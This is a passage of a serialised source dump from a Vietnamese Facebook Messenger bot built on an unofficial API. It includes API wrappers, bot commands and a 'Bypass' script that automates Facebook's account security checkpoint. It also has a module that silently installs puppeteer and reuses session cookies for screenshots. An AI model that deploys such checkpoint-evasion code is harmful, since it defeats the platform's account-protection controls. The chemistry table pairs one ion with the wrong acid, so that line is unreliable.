${lengthGroup} box`)\n    return api.sendMessage(`ƒê√£ c·∫≠p nh·∫≠t d·ªØ li·ªáu c·ªßa ${lengthGroup} box`, threadID)\n}","path":null,"size_bytes":999,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/threadColors.js":{"content":"\"use strict\";\n\nmodule.exports = function(_defaultFuncs, _api, _ctx) {\n  // Currently the only colors that can be passed to api.changeThreadColor(); may change if Facebook adds more\n  return {\n    ////MessengerBlue: null,\n    ////Viking: \"#44bec7\",\n    ////GoldenPoppy: \"#ffc300\",\n    ////RadicalRed: \"#fa3c4c\",\n    ////Shocking: \"#d696bb\",\n    ////PictonBlue: \"#6699cc\",\n    ////FreeSpeechGreen: \"#13cf13\",\n    ////Pumpkin: \"#ff7e29\",\n    ////LightCoral: \"#e68585\",\n    ////MediumSlateBlue: \"#7646ff\",\n    ////DeepSkyBlue: \"#20cef5\",\n    ////Fern: \"#67b868\",\n    ////Cameo: \"#d4a88c\",\n    ////BrilliantRose: \"#ff5ca1\",\n    ////BilobaFlower: \"#a695c7\"\n    DefaultBlue:    \"196241301102133\",\n    HotPink:        \"169463077092846\",\n    AquaBlue:       \"2442142322678320\",\n    BrightPurple:   \"234137870477637\",\n    CoralPink:      \"980963458735625\",\n    Orange:         \"175615189761153\",\n    Green:          \"2136751179887052\",\n    LavenderPurple: \"2058653964378557\",\n    Red:            \"2129984390566328\",\n    Yellow:         \"174636906462322\",\n    TealBlue:       \"1928399724138152\",\n    Aqua:           \"417639218648241\",\n    Mango:          \"930060997172551\",\n    Berry:          \"164535220883264\",\n    Citrus:         \"370940413392601\",\n    Candy:          \"205488546921017\",\n    StarWars:       \"809305022860427\"\n  };\n};","path":null,"size_bytes":1325,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/resolvePhotoUrl.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function resolvePhotoUrl(photoID, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    defaultFuncs\n      .get(\"https://www.facebook.com/mercury/attachments/photo\", ctx.jar, { photo_id: photoID })\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(resData => {\n        if (resData.error) throw resData;\n        var photoUrl = resData.jsmods.require[0][3][0];\n        return callback(null, photoUrl);\n      })\n      .catch(err => {\n        log.error(\"resolvePhotoUrl\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1022,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/addExternalModule.js":{"content":"\"use strict\";\n\nconst utils = require(\"../utils\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function addExternalModule(moduleObj) {\n    if (utils.getType(moduleObj) == \"Object\") {\n      for (let apiName in moduleObj) {\n        if (utils.getType(moduleObj[apiName]) == \"Function\") api[apiName] = moduleObj[apiName](defaultFuncs, api, ctx);\n        else throw new Error(`Item \"${apiName}\" in moduleObj must be a function, not ${utils.getType(moduleObj[apiName])}!`);\n\n      }\n    }\n    else throw new Error(`moduleObj must be an object, not ${utils.getType(moduleObj)}!`);\n  };\n};\n","path":null,"size_bytes":600,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/httpPostFormData.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  return function httpPostFormData(url, form, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback && (utils.getType(form) == \"Function\" || utils.getType(form) == \"AsyncFunction\")) {\n      callback = form;\n      form = {};\n    }\n\n    form = form || {};\n    \n    \n    callback = callback || function(err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n    };\n\n    defaultFuncs\n      .postFormData(url, ctx.jar, form)\n      .then(function(resData) {\n        callback(null, resData.body.toString());\n      })\n      .catch(function(err) {\n        log.error(\"httpPostFormData\", err);\n        return callback(err);\n      });\n\n    return returnPromise;\n  };\n};","path":null,"size_bytes":991,"size_tokens":null},"Horizon_Database/A_README.md":{"content":"This folder is used by ChernobyL(NANI =)) ) to store data. Do not delete this folder or any of the files in it.","path":null,"size_bytes":111,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getThreadPictures.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getThreadPictures(threadID, offset, limit, callback) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback) {\n      callback = function (err, data) {\n        if (err) return rejectFunc(err);\n        resolveFunc(data);\n      };\n    }\n\n    var form = {\n      thread_id: threadID,\n      offset: offset,\n      limit: limit\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function (resData) {\n        if (resData.error) throw resData;\n        return Promise.all(\n          resData.payload.imagesData.map(function (image) {\n            form = {\n              thread_id: threadID,\n              image_id: image.fbid\n            };\n            return defaultFuncs\n              .post(\"https://www.facebook.com/ajax/messaging/attachments/sharedphotos.php\", ctx.jar, form)\n              .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n              .then(function (resData) {\n                if (resData.error) throw resData;\n                // the response is pretty messy\n                var queryThreadID = resData.jsmods.require[0][3][1].query_metadata.query_path[0].message_thread;\n                var imageData = resData.jsmods.require[0][3][1].query_results[queryThreadID].message_images.edges[0].node.image2;\n                return imageData;\n              });\n          })\n        );\n      })\n      .then(resData => callback(null, resData))\n      .catch(function (err) {\n        log.error(\"Error in getThreadPictures\", err);\n        callback(err);\n      });\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1961,"size_tokens":null},"modules/commands/clcache.js":{"content":"module.exports.config = {\n    name: \"clcache\",\n    version: \"0.0.2\",\n    hasPermssion: 3,\n    credits: \"BraSL\",\n    description: \"X√≥a b·ªô nh·ªõ cache c·ªßa bot\",\n    commandCategory: \"H·ªá Th·ªëng\",\n    usages: \"Y/N\",\n    cooldowns: 5,\n   };\n   const fs = require('fs');\n   module.exports.run = async function ({ api, event, args, utils }) {\n    api.sendMessage('B·∫°n mu·ªën x√≥a theo AI hay t·ª± ch·ªçn Y/N', event.threadID, (e, info) => {\n    global.client.handleReply.push({\n    name: this.config.name,\n    author: event.senderID,\n    messageID: info.messageID\n    });\n    });\n   }\n   module.exports.handleReply = async function ({ api, event, args, handleReply }) {\n    if (handleReply.type === 'n') {\n    var a = [],\n    success = [],\n    txt = event.body.split(' ');\n    for (const type of txt) {\n    a.push(type);\n    const fileb = fs\n    .readdirSync(__dirname + `/cache`)\n    .filter((file) => file.endsWith(`.` + type));\n    for (const filec of fileb) {\n    try {\n    fs.unlinkSync(__dirname + `/cache/` + filec);\n    success.push(filec);\n    } catch {\n    api.sendMessage(\"[ ERROR ] - L·ªói khi x√≥a l∆∞u tr·ªØ: \" + filec, event.threadID);\n    }\n    }\n    }\n    if (success.length === 0) {\n    return api.sendMessage(`[ CLEAR ] - B·ªô nh·ªõ c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c x√≥a tr∆∞·ªõc ƒë√≥ ‚ùé`, event.threadID);\n    }\n    api.sendMessage(`[ CLEAR ] - X√≥a l∆∞u tr·ªØ th√†nh c√¥ng ‚òëÔ∏è`, event.threadID);\n    }\n   \n    switch (event.args[0]) {\n    case 'y':\n    case 'Y': {\n    const a = [],\n    success = [],\n    txt = [\"png\", \"jpg\", \"mp4\", \"jpeg\", \"gif\", \"m4a\", \"txt\", \"mp3\", \"wav\"];\n    for (const type of txt) {\n    a.push(type);\n    const fileb = fs\n    .readdirSync(__dirname + `/cache`)\n    .filter((file) => file.endsWith(`.` + type));\n    for (const filec of fileb) {\n    try {\n    fs.unlinkSync(__dirname + `/cache/` + filec);\n    success.push(filec);\n    } catch {\n    api.sendMessage(\"[ ERROR ] - L·ªói khi x√≥a l∆∞u tr·ªØ: \" + filec, event.threadID);\n    }\n    }\n    }\n    if (success.length === 0) {\n    return api.sendMessage(`[ CLEAR ] - B·ªô nh·ªõ c·ªßa b·∫°n ƒë√£ ƒë∆∞·ª£c x√≥a tr∆∞·ªõc ƒë√≥ ‚ùé`, event.threadID);\n    }\n    api.sendMessage(`[ CLEAR ] - X√≥a l∆∞u tr·ªØ th√†nh c√¥ng ‚òëÔ∏è`, event.threadID);\n    }\n    break;\n    case 'n':\n    case 'N': {\n    api.sendMessage('üìå Vui l√≤ng tr·∫£ l·ªùi nh·ªØng lo·∫°i t·ªáp c·∫ßn x√≥a\\nV√≠ d·ª•: mp3 mp4', event.threadID, (e, info) => {\n    global.client.handleReply.push({\n    type: 'n',\n    name: this.config.name,\n    author: event.senderID,\n    messageID: info.messageID\n    });\n    });\n    }\n    }\n   }","path":null,"size_bytes":2588,"size_tokens":null},"modules/commands/nguyentunangcao.js":{"content":"module.exports.config = {\n\tname: \"nguyentunangcao\",\n\tversion: \"1.0.0\",\n\thasPermssion: 0,\n\tcredits: \"LeMinh\",\n\tdescription: \"Nguy√™n t·ª≠ n√¢ng cao\",\n\tcommandCategory: \"Ki·∫øn Th·ª©c\",\n\tcooldowns: 0\n};\n\nmodule.exports.run = ({ event, api }) => api.sendMessage(`B·∫£ng nh√≥m nguy√™n t·ª≠ n√¢ng cao\nS√¥ÃÅ/T√™n/Ho√° tr·ªã/Axit t∆∞∆°ng ·ª©ng\n1 /Nitrat(NO3) / I / Axit nitric HNO3\n2 /Hiƒëroxit(OH) / I / kh√¥ng coÃÅ\n(t√™n naÃÄy duÃÄng trong caÃÅc h∆°Ã£p ch√¢ÃÅt v∆°ÃÅi kim loaÃ£i)\n3 /Cacbonat(CO3) / II / Axit cacbonic H2CO3\n4 /Photphat(PO4) / III / Axit photphoric H3PO4\n5 /Sunfat(SO4) / II / Axit sunfuric H2SO4\n6 /Sunfit(SO3) / II / Axit sunfur∆° H2SO3\n7 /Hiƒërocacbonat(HCO3) / I / Axit cacbonic H2SO4\n8 /Hirƒërosunfit(HSO3) / I / Axit sunfur∆° H2SO3\n9 /Hiƒërosunfat(HSO4) / I / Axit sunfuric H2SO4 \n10 /Hiƒërophotphat(HPO4) / II / Axit photphoric H3PO4\n11 /ƒêihiƒërophotphat(H2PO4) / I / Axit photphoric H3PO4\n12 /Amoni(NH4) / I / Kh√¥ng coÃÅ\n13 /Silicat(SiO3) / II / Axit silixic H2SiO3 \n14 /Clorat(ClO3) / I / Axit cloric HClO3\n15 /Peclorat(ClO4) / I / Axit pecloric HClO4\n16 /Clorit(ClO2) / I / Axit clor∆° HClO2\n17 /Hipoclorit(ClO) / I / Axit hipoclor∆° HClO\n18 /Bromat(BrO3) / I / Axit bromic HBrO3\n19 /Pemanganat(MnO4) / I / axit pemanganic HMnO4.`, event.threadID, event.messageID);","path":null,"size_bytes":1288,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/httpPost.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function httpGet(url, form, callback, notAPI) {\n    var resolveFunc = function () { };\n    var rejectFunc = function () { };\n\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (!callback && (utils.getType(form) == \"Function\" || utils.getType(form) == \"AsyncFunction\")) {\n      callback = form;\n      form = {};\n    }\n\n    form = form || {};\n\n    callback = callback || function (err, data) {\n      if (err) return rejectFunc(err);\n      resolveFunc(data);\n    };\n\n    if (notAPI) {\n      utils\n        .post(url, ctx.jar, form, ctx.globalOptions)\n        .then(resData => callback(null, resData.body.toString()))\n        .catch(function (err) {\n          log.error(\"httpPost\", err);\n          return callback(err);\n        });\n    }\n    else {\n      defaultFuncs\n        .post(url, ctx.jar, form, {})\n        .then(resData => callback(null, resData.body.toString()))\n        .catch(function (err) {\n          log.error(\"httpPost\", err);\n          return callback(err);\n        });\n    }\n    return returnPromise;\n  };\n};\n","path":null,"size_bytes":1248,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Bypass/test/index.js":{"content":"/** By @KanzuWakazaki 03/05/2024 - DD/MM/YYYY */\nvar Form_P1;\nvar CanResolve_P1;\nvar NextToken_P1;\nvar lsd;\nutils.get('https://www.facebook.com/checkpoint/828281030927956/?next=https%3A%2F%2Faccountscenter.facebook.com%2Fpassword_and_security', ctx.jar, null, ctx.globalOptions)\n    .then(function(data) {\n        lsd = utils.getFrom(data.body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\")\n        Form_P1 = {\n            lsd: lsd,\n            fb_api_caller_class: 'RelayModern',\n            fb_api_req_friendly_name: 'useEpsilonNavigateMutation',\n            variables: JSON.stringify({\n                input:{\n                    client_mutation_id:\"1\",\n                    actor_id: ctx.userId,\n                    step:\"STEPPER_CONFIRMATION\",\n                    token : JSON.stringify({\n                        sensitive_string_value: Find_And_Parse(data.body)\n                    })\n                },\n                scale:1\n            }),\n            server_timestamps: true,\n            doc_id: 7414856831926043\n        };\n    })\n.then(function() {\n    defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P1, {}) \n    .then(function(resp) {\n        let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n        if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonStepperScreen\" && checkpoint.screen.next_screen == 'CONTACT_POINT_REVIEW' && checkpoint.screen.steps.length === 3 && checkpoint.screen.steps[1].active == true) {\n            NextToken_P1 = checkpoint.screen.token;    \n            return CanResolve_P1 = true;\n        }\n        else return CanResolve_P1 = false;\n    });\n})\n\nvar CanResolve_P2;\nvar NextToken_P2;\n\nlet Form_P2 = {\n    doc_id: 7414856831926043,\n    lsd: lsd,\n    fb_api_caller_class: \"RelayModern\",\n    fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n    server_timestamps: true,\n    variables: JSON.stringify({\n        input: {\n            client_mutation_id: 2,\n            actor_id: ctx.userId,\n            step:\"CONTACT_POINT_REVIEW\",\n            token: JSON.stringify({\n                sensitive_string_value: NextToken_P1\n            })\n        },\n        scale: 1\n    })\n}\n\ndefaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P2, {}).then(function(resp) {\n    let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n    if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonContactPointReview\" && checkpoint.screen.contact_points.length >= 1 && checkpoint.screen.contact_points[0].suspicious == \"UNSUSPICIOUS\") {\n        NextToken_P2 = checkpoint.screen.token;    \n        return CanResolve_P2 = true;\n    }\n    else return CanResolve_P2 = false;\n});\n\n\nvar CanResolve_P3;\nvar NextToken_P3;\nlet Form_P3 ={\n    doc_id: 7414856831926043,\n    lsd: lsd,\n    fb_api_caller_class: \"RelayModern\",\n    fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n    server_timestamps: true,\n    variables: JSON.stringify({\n        input: {\n            client_mutation_id: 3,\n            actor_id: ctx.userId,\n            step: \"CHANGE_PASSWORD\",\n            token: JSON.stringify({\n                sensitive_string_value: NextToken_P2\n            })\n        },\n        scale:1\n    })\n}\n\ndefaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P3, {}).then(function(resp) {\n    let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n    if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonLoginDetailsConfirmationScreen\" && checkpoint.screen.contact_points.length >= 1) {\n        NextToken_P3 = checkpoint.screen.token;    \n        return CanResolve_P3 = true;\n    }\n    else return CanResolve_P3 = false;\n});\n\nvar CanResolve_P4;\nvar NextToken_P4;\nlet Form_P4 ={\n    doc_id: 7414856831926043,\n    lsd: lsd,\n    fb_api_caller_class: \"RelayModern\",\n    fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n    server_timestamps: true,\n    variables: JSON.stringify({\n        input: {\n            client_mutation_id: 4,\n            actor_id: ctx.userId,\n            step: \"OUTRO\",\n            token: JSON.stringify({\n                sensitive_string_value: NextToken_P3\n            })\n        },\n        scale:1\n    })\n}\n\ndefaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P4, {}).then(function(resp) {\n    let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n    if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonOutroScreen\" && checkpoint.screen.fallback.uri == 'https://www.facebook.com/') {\n        NextToken_P4 = checkpoint.screen.token;    \n        return CanResolve_P4 = true;\n    }\n    else return CanResolve_P4 = false;\n});\n\n\nfunction Find_And_Parse(Data) {\n    const regex = /<script\\s+type=\"application\\/json\"\\s+data-content-len=\"([0-9]+)\"\\s+data-sjs\\s*(.*?)\\s*<\\/script>/gs;\n    const matches = Data.matchAll(regex);\n    let Data_resp;\n    for (const match of matches) {\n        if (JSON.parse(JSON.stringify((match[2]))).includes('any_eligible_challenges')) {\n            const Data_ = JSON.parse(match[2].replace('>', ''))\n            Data_resp = findAnyEligibleChallengesAndSiblings(Data_)\n        }\n\n    }\n    \n    \n    function findAnyEligibleChallengesAndSiblings(data) {\n        const screenData = findScreenData(data);\n        if (!screenData) {\n            return null;\n        }\n    \n        const siblings = {};\n        for (const [key, value] of Object.entries(screenData)) {\n            if (key === 'any_eligible_challenges') {\n                siblings[key] = value;\n            } \n            else {\n                siblings[key] = value;\n            }\n        }\n    \n        return siblings;\n    }\n    \n    function findScreenData(data) {\n        if (Array.isArray(data)) {\n            for (const item of data) {\n                const result = findScreenData(item);\n                if (result) {\n                    return result;\n                }\n            }\n        } \n        else if (typeof data === 'object' && data !== null) {\n            if (data.screen) {\n                return data.screen;\n            }\n            for (const value of Object.values(data)) {\n                const result = findScreenData(value);\n                if (result) {\n                    return result;\n                }\n            }\n        }\n        return null;\n    }    \n    return Data_resp.token || null\n}","path":null,"size_bytes":6410,"size_tokens":null},"lib/fca-auto/src/getCurrentUserID.js":{"content":"\"use strict\";\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n  return function getCurrentUserID() {\n    return ctx.userID;\n  };\n};\n","path":null,"size_bytes":138,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getUserInfoV5.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n\n  return function getUserInfoV5GraphQL(id, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n\n    // `queries` has to be a string. I couldn't tell from the dev console. This\n    // took me a really long time to figure out. I deserve a cookie for this.\n    var form = {\n      queries: JSON.stringify({\n        o0: {\n          // This doc_id is valid as of July 20th, 2020\n          doc_id: \"5009315269112105\",\n          query_params: {\n            ids: [id]\n          }\n        }\n      }),\n      batch_name: \"MessengerParticipantsFetcher\"\n    };\n      defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function(resData) {\n      if (resData.error) {\n        throw resData;\n      }\n      // This returns us an array of things. The last one is the success /\n      // failure one.\n      // @TODO What do we do in this case?\n      if (resData[resData.length - 1].error_results !== 0) {\n        console.error(\"GetThreadInfo\", \"B·∫°n ƒêang B·ªã ƒÇn Get V√¨ S·ª≠ D·ª•ng Qu√° Nhi·ªÅu !\");\n      }\n        callback(null, resData);\n    })\n    .catch(function(err) {\n      log.error(\"getThreadInfoGraphQL\", \"L·ªói: getUserInfoV5 C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu, H√£y Th·ª≠ L·∫°i !\");\n    return callback(err);\n  });\n    return returnPromise;\n    };\n};","path":null,"size_bytes":1883,"size_tokens":null},"lib/fca-auto/src/Screenshot.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\n\nmodule.exports = function (defaultFuncs, api, ctx) {\n    var Coookie = JSON.parse(JSON.stringify(ctx.jar.getCookies(\"https://www.facebook.com\").concat(ctx.jar.getCookies(\"https://facebook.com\")).concat(ctx.jar.getCookies(\"https://www.messenger.com\"))));\n    for (let i of Coookie) {\n        i.name = i.key;\n        i.domain = 'www.facebook.com';\n        delete i.key;\n    }\n    return function(Link, callback) {\n        var logger = require('../logger');\n        if (process.platform != 'win32') return logger.Error('Not Supported Platform');\n        else try {\n            let i = require('puppeteer');\n        }   \n        catch (e) {\n            var { execSync } = require('child_process');\n            execSync('npm i puppeteer', { stdio: 'inherit' });\n        }\n            const Screenshot = require('../Extra/ExtraScreenShot');\n                var resolveFunc = function () { };\n                var rejectFunc = function () { };\n                var returnPromise = new Promise(function (resolve, reject) {\n                resolveFunc = resolve;\n                rejectFunc = reject;\n                });\n\n                if (!callback) {\n                    callback = function (err, data) {\n                        if (err) return rejectFunc(err);\n                        resolveFunc(data);\n                    };\n                }\n        if (Link.includes('facebook.com') || Link.includes('Facebook.com') || Link.includes('fb')) {\n            let LinkSplit = Link.split('/');\n                if (LinkSplit.indexOf(\"https:\") == 0) {\n                    if (Link.includes('messages')) {\n                        Screenshot.buffer(Link, {\n                            cookies: Coookie\n                        }).then(data => {\n                            callback(null,data);\n                        });\n                    }\n                    else if (!isNaN(LinkSplit[3]) && !Link.split('=')[1]  && !isNaN(Link.split('=')[1])) {\n                        api.sendMessage('Invaild link, format link: facebook.com/Lazic.Kanzu',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n                        callback('Error Link', null);\n                    }\n                    else if (!isNaN(Link.split('=')[1]) && Link.split('=')[1]) {\n                        let Format = `https://www.facebook.com/profile.php?id=${Link.split('=')[1]}`;\n                        Screenshot.buffer(Format, {\n                            cookies: Coookie\n                        }).then(data => {\n                            callback(null,data);\n                        });\n                    } \n                    else {\n                        let Format = `https://www.facebook.com/${LinkSplit[3]}`;\n                        Screenshot.buffer(Format, {\n                            cookies: Coookie\n                        }).then(data => {\n                            callback(null,data);\n                        });\n                    }\n                }\n                else {\n                    let Form = `https://www.facebook.com/${LinkSplit[1]}`;\n                    Screenshot.buffer(Form, {\n                        cookies: Coookie\n                    }).then(data => {\n                        callback(null,data);\n                    });\n                }\n            }\n                else {\n                    Screenshot.buffer(Link).then(data => {\n                        callback(null,data);\n                    });\n                }\n            return returnPromise;\n    };\n};","path":null,"size_bytes":3546,"size_tokens":null},"lib/Fca-Horizon-Remastered/src/getThreadHistory.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n\nfunction formatAttachmentsGraphQLResponse(attachment) {\n  switch (attachment.__typename) {\n    case \"MessageImage\":\n      return {\n        type: \"photo\",\n        ID: attachment.legacy_attachment_id,\n        filename: attachment.filename,\n        thumbnailUrl: attachment.thumbnail.uri,\n\n        previewUrl: attachment.preview.uri,\n        previewWidth: attachment.preview.width,\n        previewHeight: attachment.preview.height,\n\n        largePreviewUrl: attachment.large_preview.uri,\n        largePreviewHeight: attachment.large_preview.height,\n        largePreviewWidth: attachment.large_preview.width,\n\n        // You have to query for the real image. See below.\n        url: attachment.large_preview.uri, // @Legacy\n        width: attachment.large_preview.width, // @Legacy\n        height: attachment.large_preview.height, // @Legacy\n        name: attachment.filename, // @Legacy\n\n        // @Undocumented\n        attributionApp: attachment.attribution_app\n          ? {\n            attributionAppID: attachment.attribution_app.id,\n            name: attachment.attribution_app.name,\n            logo: attachment.attribution_app.square_logo\n          }\n          : null\n\n        // @TODO No idea what this is, should we expose it?\n        //      Ben - July 15th 2017\n        // renderAsSticker: attachment.render_as_sticker,\n\n        // This is _not_ the real URI, this is still just a large preview.\n        // To get the URL we'll need to support a POST query to\n        //\n        //    https://www.facebook.com/webgraphql/query/\n        //\n        // With the following query params:\n        //\n        //    query_id:728987990612546\n        //    variables:{\"id\":\"100009069356507\",\"photoID\":\"10213724771692996\"}\n        //    dpr:1\n        //\n        // No special form though.\n      };\n    case \"MessageAnimatedImage\":\n      return {\n        type: \"animated_image\",\n        ID: attachment.legacy_attachment_id,\n        filename: attachment.filename,\n\n        previewUrl: attachment.preview_image.uri,\n        previewWidth: attachment.preview_image.width,\n        previewHeight: attachment.preview_image.height,\n\n        url: attachment.animated_image.uri,\n        width: attachment.animated_image.width,\n        height: attachment.animated_image.height,\n\n        thumbnailUrl: attachment.preview_image.uri, // @Legacy\n        name: attachment.filename, // @Legacy\n        facebookUrl: attachment.animated_image.uri, // @Legacy\n        rawGifImage: attachment.animated_image.uri, // @Legacy\n        animatedGifUrl: attachment.animated_image.uri, // @Legacy\n        animatedGifPreviewUrl: attachment.preview_image.uri, // @Legacy\n        animatedWebpUrl: attachment.animated_image.uri, // @Legacy\n        animatedWebpPreviewUrl: attachment.preview_image.uri, // @Legacy\n\n        // @Undocumented\n        attributionApp: attachment.attribution_app\n          ? {\n            attributionAppID: attachment.attribution_app.id,\n            name: attachment.attribution_app.name,\n            logo: attachment.attribution_app.square_logo\n          }\n          : null\n      };\n    case \"MessageVideo\":\n      return {\n        type: \"video\",\n        filename: attachment.filename,\n        ID: attachment.legacy_attachment_id,\n\n        thumbnailUrl: attachment.large_image.uri, // @Legacy\n\n        previewUrl: attachment.large_image.uri,\n        previewWidth: attachment.large_image.width,\n        previewHeight: attachment.large_image.height,\n\n        url: attachment.playable_url,\n        width: attachment.original_dimensions.x,\n        height: attachment.original_dimensions.y,\n\n        duration: attachment.playable_duration_in_ms,\n        videoType: attachment.video_type.toLowerCase()\n      };\n    case \"MessageFile\":\n      return {\n        type: \"file\",\n        filename: attachment.filename,\n        ID: attachment.message_file_fbid,\n\n        url: attachment.url,\n        isMalicious: attachment.is_malicious,\n        contentType: attachment.content_type,\n\n        name: attachment.filename, // @Legacy\n        mimeType: \"\", // @Legacy\n        fileSize: -1 // @Legacy\n      };\n    case \"MessageAudio\":\n      return {\n        type: \"audio\",\n        filename: attachment.filename,\n        ID: attachment.url_shimhash, // Not fowardable\n\n        audioType: attachment.audio_type,\n        duration: attachment.playable_duration_in_ms,\n        url: attachment.playable_url,\n\n        isVoiceMail: attachment.is_voicemail\n      };\n    default:\n      return {\n        error: \"Don't know about attachment type \" + attachment.__typename\n      };\n  }\n}\n\nfunction formatExtensibleAttachment(attachment) {\n  if (attachment.story_attachment) {\n    return {\n      type: \"share\",\n      ID: attachment.legacy_attachment_id,\n      url: attachment.story_attachment.url,\n\n      title: attachment.story_attachment.title_with_entities.text,\n      description: attachment.story_attachment.description && attachment.story_attachment.description.text,\n      source: attachment.story_attachment.source == null ? null : attachment.story_attachment.source.text,\n\n      image: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).uri,\n      width: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).width,\n      height: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).height,\n      playable: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.is_playable,\n      duration: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.playable_duration_in_ms,\n      playableUrl: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.playable_url,\n\n      subattachments: attachment.story_attachment.subattachments,\n\n      // Format example:\n      //\n      //   [{\n      //     key: \"width\",\n      //     value: { text: \"1280\" }\n      //   }]\n      //\n      // That we turn into:\n      //\n      //   {\n      //     width: \"1280\"\n      //   }\n      //\n      properties: attachment.story_attachment.properties.reduce(function (obj, cur) {\n        obj[cur.key] = cur.value.text;\n        return obj;\n      }, {}),\n\n      // Deprecated fields\n      animatedImageSize: \"\", // @Legacy\n      facebookUrl: \"\", // @Legacy\n      styleList: \"\", // @Legacy\n      target: \"\", // @Legacy\n      thumbnailUrl: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).uri, // @Legacy\n      thumbnailWidth: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).width, // @Legacy\n      thumbnailHeight: attachment.story_attachment.media == null ? null : attachment.story_attachment.media.animated_image == null && attachment.story_attachment.media.image == null ? null : (attachment.story_attachment.media.animated_image || attachment.story_attachment.media.image).height // @Legacy\n    };\n  }\n  else return { error: \"Don't know what to do with extensible_attachment.\" };\n}\n\nfunction formatReactionsGraphQL(reaction) {\n  return {\n    reaction: reaction.reaction,\n    userID: 